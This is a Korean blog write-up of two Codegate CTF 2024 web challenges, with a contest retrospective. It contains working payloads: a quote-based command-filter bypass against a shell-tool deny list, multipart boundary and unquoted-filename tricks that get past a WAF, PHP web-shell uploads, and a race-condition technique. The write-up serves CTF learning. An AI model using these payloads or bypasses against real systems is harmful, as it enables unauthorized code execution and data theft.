---
layout: post
title: CodegateCTF 2024
description: CTF Write-up
tags: CodegateCTF 
category: ctf
---   
     
# CodegateCTF

## 대회 일정
**2024-06-01 10:00 ~ 2024-06-02 10:00**
     
## 대회 후기       
               
RubiyaLab Discord에서 팀을 구성해서 Codegate 2024에 참가하게되었다. 
대회에 참가하기 위해 근무 스케줄을 변경했지만, 정전 이슈로 인해 오후 6시까지 대회에 참가할 수 없었다...
      
여튼 늦게나마 문제를 풀어보자는 마음으로 임했고, 웹 문제들을 살펴봤다.     
1번 문제는 솔브도 많이 나있는 상태였고 같은 팀원이 웹 1번을 `/api/hidden` 페이지까지 접속한 상태였기에 이 문제 먼저 해결하고자 문제를 읽기 시작했다.      
     
명령어만 우회하면 되는 상황이었어서 '(quote)를 사용해서 페이로드를 작성했고 문제를 해결할 수 있었다.      
웹 2번 문제는 루비 문제였는데 SSTI 취약점이 터지는 것까지는 알았으나 루비를 정말 하나도 몰라서 웹 3번으로 갔다.    

웹 3번은 파일 업로드 취약점 문제였는데 `<?php` 우회, `Race Condition`으로 파일 접근하는 것까지 알았지만, 확장자를 우회하는 방법을 못찾아서 대회 당시에 해결하지 못했다. Null Byte Injection을 시도하긴 했지만, `\0` 문자를 사용해서 우회가 되지 않았고 대회가 끝나고 `\x00`를 사용해야한다는 사실을 알게 되어 조금 허탈하긴 했다...    
         
작년 문제들보단 조금 쉽게 출제된 것 같았고, 좋은 지식들을 얻을 수 있어서 좋았던 것 같다.    
       
<img src="/assets/images/ctf/2024/codegate/scoreboard.jpg" width="700px">          
       
최종적으로, 우리팀은 46등으로 마무리했고 나름 재밌게 참여했던 것 같다.            
           
<img src="/assets/images/ctf/2024/codegate/score.jpg" width="700px">       
       
주 분야였던 웹을 하나 밖에 못푼게 아쉽긴 하지만 그래도 이번을 계기로 더 열심히해야겠다는 생각이 들었던 것 같다.     
정전 이슈만 아니었다면 ...(?) 이라며 변명을 해봅니다 ...       
           
## Writeup   
        
- <a href="#Chatting-Service">Chatting-Service</a>     
<!-- - <a href="#master_of_calculator">master_of_calculator</a>    -->
- <a href="#Cha's-Wall">Cha's-Wall</a>   
<!-- - <a href="#gnxboard">gnxboard</a>      -->

<a id="Chatting-Service"></a>      
       
# Chatting-Service     
           
82 solved / 250 pts                   
       
<img src="/assets/images/ctf/2024/codegate/chatting-service/home.jpg" width="700px">     
       
홈페이지에 접속하면 회원가입을 진행해 로그인해야한다.      

<img src="/assets/images/ctf/2024/codegate/chatting-service/add_chat_room.jpg" width="700px">                    
           
로그인을 하면 방을 생성하는 버튼이 보이게 되고, 버튼을 눌러 방 10개를 생성하면 `Cannot Add Anymore` 문구가 뜨면서 방을 더이상 생성할 수 없다는 알림이 뜬다.      
        
```go
func ValidateHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
	var count int
	fmt.Println("[ValidateHandler] Entrance")

	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
		fmt.Printf("Error reading request body: %v\n", err)
		return
	}
	data := structure.AddRoomInfo{
		Username:      "NULL",
		ChatRoomIndex: 0,
	}

	err = json.Unmarshal(body, &data)

	if err != nil {
		http.Error(w, "Failed to unmarshal request body", http.StatusInternalServerError)
		fmt.Printf("Error unmarshaling request body: %v\n", err)
		return
	}

	data2 := structure.User{
		Id: data.Username,
	}

	count = reg.IsValidRoomManage(db, data)

	var response structure.CheckRoomCount

	response.ChatRoomCount = count

	if count >= 0 && count <= 9 {
		reg.Hidden(db, data2, 0)
		response.ReturnVal = 1
		w.WriteHeader(http.StatusOK)
	}
	if count == 10 {
		reg.Hidden(db, data2, 0)
		response.ReturnVal = -1
		w.WriteHeader(http.StatusOK)
	}
	if count > 10 {
		reg.Hidden(db, data2, 1)
		response.ReturnVal = 2
		w.WriteHeader(http.StatusOK)
	}

	jsonResponse, err := json.Marshal(response)
	if err != nil {
		http.Error(w, "Failed to marshal response", http.StatusInternalServerError)
		fmt.Printf("Error marshaling response: %v\n", err)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonResponse)
}
```        
방을 10개 초과로 생성 시, `/api/hidden`에 접근 권한이 생겨 방을 11개 이상으로 추가해야한다.       
        
방 생성 로직에서 10개 이상 만드는 것을 검증하고 있지 않기 때문에 브라우저 콘솔에서 
`addChatRoom()`, `isValidRoom()`를 호출하여 방을 추가로 생성할 수 있게된다.      
       
<img src="/assets/images/ctf/2024/codegate/chatting-service/command.jpg" width="700px">          
        
`/api/hidden` 엔드포인트에 접속하면, 계정과 세션 값을 통해 명령을 입력할 수 있다.    

계정과 세션 값은 쿠키에 저장이 되어있어 사용하고, 명령을 입력해주면 된다.              

```javascript
$('#debugForm').submit(function(event) {
    event.preventDefault();

    const username = $('#username').val();
    const session = $('#session').val();
    const command = $('#command').val();

    $.ajax({
        url: 'http://127.0.0.1:5000/login',
        method: 'POST',
        data: {
            username: username,
            session: session,
            command: command
        },
        success: function(response) {
            $('.result').css('color', '#ffffff'); 
            $('.result').text(response);
        },
        error: function(xhr, status, error) {
            console.error('Request failed. Status:', xhr.status);
        }
    });
});
```
`Test` 버튼을 누르면, `http://127.0.0.1:5000/login`에 요청을 보내게 되고 명령을 실행하여 결과 값을 받아온다.    
     
```python
import os
import socket
import asyncio
import psycopg2
import subprocess
import mysql.connector
from psycopg2 import Error
from pymemcache.client import base 
from flask import Flask
from flask import session
from flask import request
from flask_cors import CORS
from flask import render_template
from flask import make_response
from pymemcache.client.base import Client
from sqlalchemy import create_engine
from sqlalchemy import Table, Column, Integer, String
from sqlalchemy.orm import sessionmaker
from sqlalchemy.orm import declarative_base

app = Flask(__name__)
app.secret_key = "codegate2024-prequal"
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
mysql_engine = create_engine(app.config['SQLALCHEMY_DATABASE_URI'], echo=True)
Session = sessionmaker(mysql_engine)
mysql_session = Session()
Base = declarative_base()
CORS(app,origins="*")

memcache_ip = os.environ.get('MEMCACHE_IP')
print(f'memcache ip = {memcache_ip}')
client = Client(memcache_ip)
print(f'memcache client = {client}')

try:
    conn = psycopg2.connect(
                                database=os.environ.get('DB_NAME'),
                                user=os.environ.get('DB_USER'),
                                password=os.environ.get('DB_PASSWORD'),
                                host=os.environ.get('DB_HOST'),
                                port=os.environ.get('DB_PORT')
                        )
except Exception as e:
    print(e)

try:       
    client.set("flag","codegate2024{##CENSORED##}")
except Exception as e:
    print(f'memcache ==>  {e}')

SOCKET_PATH = './codegate2024.sock'

class AdminMessage(Base):
    __tablename__ = 'admin_message'
    id = Column(Integer, primary_key=True, autoincrement=True)
    message = Column(String(1000))

class Message(Base):
    __tablename__ = 'message'
    id = Column(Integer, primary_key=True, autoincrement=True)
    message = Column(String(500))

def send_command(command):
    try:
        print(f'will be send data : {command}')
        client_socket = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client_socket.settimeout(5)
        
        client_socket.connect(SOCKET_PATH)
        client_socket.sendall(command.encode())
        
        response = client_socket.recv(1024).decode()
        return response
    except socket.timeout:
        return "Invalid Command"
    except Exception as e:
        print(e)
        return str(e)

def internalDaemonService(command):
    if command.startswith("admin://"):
        msg = AdminMessage(message=f'{command}')
        try:
            mysql_session.add(msg)
            mysql_session.commit()
        except Exception as e:
            print(e)
        finally:
            mysql_session.close()
        
        commandline = "cd /tmp &&"
        tmp = command.split("admin://")[1]
        commandline += tmp
        client.set(f'msg', f'{tmp}')

        filtered = ["memccat", "memcstat", "memcdump", "nc", "bash", "/bin", "/sh", "export", "env", "socket", "connect", "open", "set", "membash", "delete", "flush_all", "stats", "which" , "python", "perl", "rm", "mkdir", ".", "/"]

        for _filter in filtered:
            if _filter in tmp.lower():
                print(f'filter data : {_filter}')
                return "FILTER MESSAGE DETECTED"
        
        try:
            response = send_command(commandline)
            return response
        except Exception as e:
            return str(e)
    
    else:
        msg = Message(message=f'{command}')
        try:
            mysql_session.add(msg)
            mysql_session.commit()
        except Exception as e:
            print(e)
        finally:
            mysql_session.close()
        return f"The Message is already saved on DB : {command}"

def isValidateSession(username, session, command):
    cur = conn.cursor()
    query = f"SELECT session, session_enable FROM register where username='{username}' and session='{session}'"
    print(f'query : {query}')
    
    if username == None or session == None:
        return "NONE"

    if "'" in username or "'" in session:
        return "DO NOT TRY SQL INJECTION"
    
    try:
        cur.execute(query)
        result = cur.fetchone()
        
        if result:
            internal_session, session_enable = result
            if internal_session == session:
                return internalDaemonService(command)
            
        else:
            return "Please recheck username or Session"
        
    except Exception as e:
        print(f'exception: {e}')
    
    return "NONE"


@app.route('/')
def index():
    return "Debug Mode"

@app.route("/login", methods=["GET", "POST"])
def debugLoginPage():
    response = make_response()
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add('Access-Control-Allow-Headers', "*")
    response.headers.add('Access-Control-Allow-Methods', "*")
    if request.method == "GET":
        return "CANNOT LOGIN YOURSELF"
    if request.method == "POST":
        try:
            web_username = request.form.get('username') 
            web_session = request.form.get('session')
            command = request.form.get('command')
            response_result = isValidateSession(web_username,web_session, command)
        except Exception as e:
            print(e)
        return render_template('main.html', response_result=response_result)

def init_db(Base,mysql_engine):
    try:
        Base.metadata.create_all(mysql_engine)
        print('Table is creaetd.')
    except Exception as e:
        print(e)
    

def drop_db(Base,mysql_engine):
    Base.metadata.drop_all(mysql_engine)
    print('Table is removed.')

if __name__ == '__main__':
    drop_db(Base,mysql_engine)
    init_db(Base,mysql_engine)
    app.run(host='0.0.0.0',debug=True,port=5000)
```     
명령은 `admin://`로 시작해야하고 `["memccat", "memcstat", "memcdump", "nc", "bash", "/bin", "/sh", "export", "env", "socket", "connect", "open", "set", "membash", "delete", "flush_all", "stats", "which" , "python", "perl", "rm", "mkdir", ".", "/"]` 문자들을 사용할 수 없도록 필터링 해놓았다.    
       
하지만, '(quote)를 사용하여 필터링을 우회할 수 있다.        

### Exploit Code     
       
`admin://'m''e''m''c''c''a''t' --servers=localhost get flag`    
        
위 명령을 사용해서 플래그를 획득할 수 있다.    

<img src="/assets/images/ctf/2024/codegate/chatting-service/flag.jpg" width="700px">                 
          
### Flag        
codegate2024{Important_DATA_DO_NOT_SAVE_IN_MEMCACHE}                    
                
<!-- <a id="master_of_calculator"></a>      
                
# master_of_calculator     
           
71 solved / 250 pts                        
              
### Exploit Code     
       
### Flag      
codegate2024{sup3r_dup3r_ruby_trick_m4st3r} -->
           
<a id="Cha's-Wall"></a>                 

# Cha's-Wall     
           
38 solved / 250 pts                        
       
```bash
version: '3'

services:
  backend:
    build:
      context: backend
    restart: unless-stopped
  waf:
    build:
      context: WAF
    restart: unless-stopped
    ports:
      - 8000:8080
    links:
      - backend
    depends_on:
      - backend
```    
      
`docker-compose` 파일을 보면, 두 개의 서버로 구성되어있는 것을 확인할 수 있다.      

```go
package main

import (
   "bytes"
   "fmt"
   "io"
   "io/ioutil"
   "log"
   "net/http"
	"regexp"
	"strings"
   "mime/multipart"
)

type HttpConnection struct {
   Request  *http.Request
   Response *http.Response
}

type HttpConnectionChannel chan *HttpConnection

var connChannel = make(HttpConnectionChannel)

func PrintHTTP(conn *HttpConnection) {
   fmt.Printf("%v %v\n", conn.Request.Method, conn.Request.RequestURI)
   for k, v := range conn.Request.Header {
      fmt.Println(k, ":", v)
   }
   fmt.Println("==============================")
}

type Proxy struct {
}

func NewProxy() *Proxy { return &Proxy{} }

func (p *Proxy) ServeHTTP(wr http.ResponseWriter, r *http.Request) {
   var resp *http.Response
   var err error
   var req *http.Request

   buf, _ := ioutil.ReadAll(r.Body)
   rdr := ioutil.NopCloser(bytes.NewBuffer(buf))
   rdr2 := ioutil.NopCloser(bytes.NewBuffer(buf))
   r.Body = rdr

   client := &http.Client{}

   r.RequestURI = "http://backend:80" + r.RequestURI

   if strings.ToLower(r.Method) != "get" && strings.ToLower(r.Method) != "post" {
      r.Body.Close()
      wr.Write([]byte("Nop"))
      return
   }

   if r.Method == "POST" {
      mr, err := r.MultipartReader()
      if err != nil {
          r.Body.Close()
          fmt.Println("Http request is corrupted.")
          return
      } else {
          var b bytes.Buffer
          w := multipart.NewWriter(&b)
          reuseBody := true
  
          for {
              part, err := mr.NextPart()
              if err == io.EOF {
                  break
              }
              if err != nil {
                  r.Body.Close()
                  wr.Write([]byte("something wrong :("))
                  return
              }
              if part.FileName() != "" {
                  re := regexp.MustCompile(`[^a-zA-Z0-9\.]+`)
                  cleanFilename := re.ReplaceAllString(part.FileName(), "")
                  match, _ := regexp.MatchString(`\.(php|php2|php3|php4|php5|php6|php7|phps|pht|phtm|phtml|pgif|shtml|htaccess|inc|hphp|ctp|module|phar)$`, cleanFilename)
                  if match {
                      r.Body.Close()
                      wr.Write([]byte("WAF XD"))
                      return
                  }
                  partBuffer, _ := ioutil.ReadAll(part);
                  if strings.Contains(string(partBuffer), "<?php") {
                      r.Body.Close()
                      wr.Write([]byte("WAF XD"))
                      return
                  }
              } else {
                  fieldName := part.FormName()
                  fieldValue, _ := ioutil.ReadAll(part)
                  _ = w.WriteField(fieldName, string(fieldValue))
                  reuseBody = false
              }
          }

          if !reuseBody {
              w.Close()
              rdr2 = ioutil.NopCloser(&b)
              r.Header.Set("Content-Type", w.FormDataContentType())
          }
      }
  }  
   req, err = http.NewRequest(r.Method, r.RequestURI, rdr2)

   for name, value := range r.Header {
      if strings.Contains(strings.ToLower(value[0]), "charset") == true || strings.Contains(strings.ToLower(value[0]), "encod") == true {
         r.Body.Close()
         wr.Write([]byte("WAF XD"))
         return
      }
      req.Header.Set(name, value[0])
   }

   resp, err = client.Do(req)
   r.Body.Close()

   if err != nil {
      http.Error(wr, err.Error(), http.StatusInternalServerError)
      return
   }

   conn := &HttpConnection{r, resp}

   for k, v := range resp.Header {
      wr.Header().Set(k, v[0])
   }
   wr.WriteHeader(resp.StatusCode)
   io.Copy(wr, resp.Body)
   resp.Body.Close()

   PrintHTTP(conn)
}

func main() {
   proxy := NewProxy()
   fmt.Println("==============================")
   err := http.ListenAndServe(":8080", proxy)
   if err != nil {
      log.Fatal("ListenAndServe: ", err.Error())

   }
}
```          
      
파일을 업로드하면, 확장자 검사 및 파일 내용에 `<?php` 가 포함되어있는지 검증한다.     
두 조건을 모두 통과하면, PHP로 동작하는 `http://backend:80` 서버에 파일을 전달한다.     
        
```php
<?php
    require_once("./config.php");
    session_start();
    
    if (!isset($_SESSION['dir'])) {
        $_SESSION['dir'] = random_bytes(4);
    }

    $SANDBOX = getcwd() . "/uploads/" . md5("supers@f3salt!!!!@#$" . $_SESSION['dir']);
    if (!file_exists($SANDBOX)) {
        mkdir($SANDBOX);
    }

    echo "Here is your current directory : " . $SANDBOX . "<br>";

    if (is_uploaded_file($_FILES['file']['tmp_name'])) {
        $filename = basename($_FILES['file']['name']);
        if (move_uploaded_file( $_FILES['file']['tmp_name'], "$SANDBOX/" . $filename)) {
            echo "<script>alert('File upload success!');</script>";
        }
    }
    if (isset($_GET['path'])) {
        if (file_exists($_GET['path'])) {
            echo "file exists<br><code>";
            if ($_SESSION['admin'] == 1 && $_GET['passcode'] === SECRET_CODE) {
                include($_GET['path']);
            }
            echo "</code>";
        } else {
            echo "file doesn't exist";
        }
    }
    if (isset($filename)) {
        unlink("$SANDBOX/" . $filename);
    }
?>

<form enctype='multipart/form-data' action='index.php' method='post'>
	<input type='file' name='file'>
	<input type="submit" value="upload"></p>
</form>
```

PHP에서는 파일 업로드 시 `unlink()`를 통해 즉시 파일을 삭제한다.     
하지만, `Race Condition` 취약점이 존재하기 때문에 파일에 접근이 가능하다. 

핵심 부분은 파일 확장자를 우회하는 것으로 `Null Byte Injection`, `Multipart` 데이터 구조를 변형시켜보는 등 
대회 당시 여러 방법들을 시도했지만, 확장자를 우회할 수 없었다.       
       
대회가 끝나고 @Ginoah 분께서 사용하신 방법을 사용해보니 해결할 수 있었다.             
                
```php
POST /index.php HTTP/1.1
Host: 3.39.6.7:8000
Content-Length: 237
Content-Type: multipart/form-data; BOUNDARY=go; xboundary=php;
Cookie: PHPSESSID=[[SESSION]]
Connection: close

--go
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--php
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/plain

<%=`/readflag`;?>
--php--
--go--
```   
`Multipart` 데이터의 `boundary`를 나눠 Go로 구현된 웹에서는 파일명이 test.txt로 인식되고, 
PHP 웹 서버로 요청을 보낼 때는 `php boundary` 내용이 전달되도록 하여 확장자를 우회시키는 것이었다.    
       
```php 
[Skip] 
-----------------------------28100023299015186381277434465
Content-Disposition: form-data; name="file"; filename=test.php; filename*=UTF-8''a
Content-Type: application/octet-stream

<?= system('/readflag'); ?>
-----------------------------28100023299015186381277434465--
```

출제자분의 의도된 문제 풀이 방향은 `filename`에 `quote`를 사용하지 않고 위와 같은 방식으로 우회하는 것이었다.     
      
> Warning: The string following filename should always be put into quotes; but, for compatibility reasons, many browsers try to parse unquoted names that contain spaces.       
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition      
        
MDN 공식 문서에서 언급한 것과 유사하게 Quote로 파일 명을 제대로 묶어주지 않으면 
공백을 포함한 이름들까지 parse를 시도하려고 한다는 점을 활용하여 우회가 가능해진다.     
        
파일 확장자 우회는 두 방법을 통해 가능하기에 Race Condition을 발생시켜 문제를 해결할 수 있엇다.     
     
Race Condition의 확률을 높이기 위한 방법이 또 존재했는데 그것은 `ftp://` 프로토콜을 사용하는 것이었다.    
        
> As of PHP 5.0.0, this function can also be used with some URL wrappers. Refer to Supported Protocols and Wrappers to determine which wrappers support stat() family of functionality.     
              
문제에서 사용된 PHP 함수 중에 `file_exists()` 함수는 PHP 5.0.0 버전부터 다양한 Wrapper들을 사용할 수 있게 바뀌었다.     

https://www.php.net/manual/en/wrappers.php 

위 링크에 존재하는 wrapper들은 모두 사용이 가능하기에 `ftp://`을 사용해주면 대략 30초 정도  `pending` 상태가 되어 `unlink()` 함수가 실행되지 않고 사용자가 파일에 접근이 가능해져 문제를 해결할 수 있게 된다.                           
                  
### Exploit Code     
      
- PHP Extension Bypass 
     
1. Method # 1 
<img src="/assets/images/ctf/2024/codegate/chas-wall/exploit.jpg" width="700px">      
      
2. Method # 2
<img src="/assets/images/ctf/2024/codegate/chas-wall/exploit2.jpg" width="700px">      
   
위 방식대로 파일 업로드 후, PHP 파일에 접근하면 플래그를 획득할 수 있다.    
       
```python
import requests 

url = "http://3.39.6.7:8000"

s = requests.session() 
s.cookies.set("PHPSESSID", "[SESSION]",domain=f"{url[7:]}")

r = s.get(
    f"{url}/uploads/fb7ba2078c91ec9b52730e624d6f5ed2/test.php",
)
if r.status_code == 200:
    print(r.text) 
```       
<img src="/assets/images/ctf/2024/codegate/chas-wall/flag.jpg" width="700px">         
       
### Flag      
codegate2024{caaff9a2603c3225626f1569a0d371d7d2c354177f48bd303aa9a5297f40d55b}
                       
